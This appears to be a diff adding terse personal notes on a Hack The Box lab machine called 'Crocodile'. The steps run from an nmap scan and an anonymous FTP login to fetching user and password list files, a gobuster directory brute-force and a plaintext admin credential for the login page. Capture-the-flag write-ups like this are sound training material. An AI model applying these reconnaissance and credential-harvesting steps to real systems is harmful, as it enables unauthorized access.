@@ -71,3 +71,20 @@
 - USE htb;
 - SHOW tables;
 - SELECT * FROM config;
+
+
+## Crocodile challenge:
+- nmap -sC -sV 10.129.146.153
+- ftp-anon: Anonymous FTP login allowed (FTP code 230)
+- ftp 10.129.146.153
+- Name (10.129.146.153:ahmed20078): anonymous
+- ftp> help
+- ftp> dir
+- ftp> get allowed.userlist
+- ftp> get allowed.userlist.passwd
+- ftp> exit
+- cat allowed.userlist
+- cat allowed.userlist.passwd
+- gobuster dir --url http://10.129.146.153/ --wordlist /media/ahmed20078/ahmed78/Documents/Cyber Projects/go/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html
+- http://10.129.146.153/login.php
+- admin:svndkfngksjvrdkufhkr
